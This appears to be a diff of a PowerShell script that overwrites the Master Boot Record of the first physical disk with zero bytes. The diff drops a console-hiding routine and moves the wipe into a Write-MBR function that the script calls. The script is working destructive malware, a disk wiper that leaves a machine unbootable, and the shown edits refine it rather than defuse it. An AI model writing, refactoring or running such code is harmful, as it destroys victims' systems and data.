@@ -1,30 +1,21 @@
-$signature = @'
-[DllImport("kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'@
-
-Add-Type -MemberDefinition $signature -Namespace ConsoleUtils -Name NativeMethods
-
-Function HideConsoleWindow() {
-    $consoleWindow = [ConsoleUtils.NativeMethods]::GetConsoleWindow()
-    [ConsoleUtils.NativeMethods]::ShowWindow($consoleWindow, 0)
-}
-
 $MBR_SIZE = 512
 
-$MasterBootRecord = [System.IO.File]::Open("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
-$MBRData = [byte[]]::new($MBR_SIZE)
+function Write-MBR {
+    $mbrData = New-Object byte[] $MBR_SIZE
 
-try {
-    $MasterBootRecord.Write($MBRData, 0, $MBR_SIZE)
-    Start-Sleep -Seconds 5
-    Exit
-} catch {
-    # Exception handling code goes here (if desired)
-} finally {
-    $MasterBootRecord.Close()
+    $MasterBootRecord = [System.IO.FileStream]::new("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
+
+    try {
+        $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
+        Start-Sleep -Milliseconds 5000
+        exit
+    }
+    catch {
+        # Handle the exception if needed
+    }
+    finally {
+        $MasterBootRecord.Close()
+    }
 }
 
-Exit 1
+Write-MBR
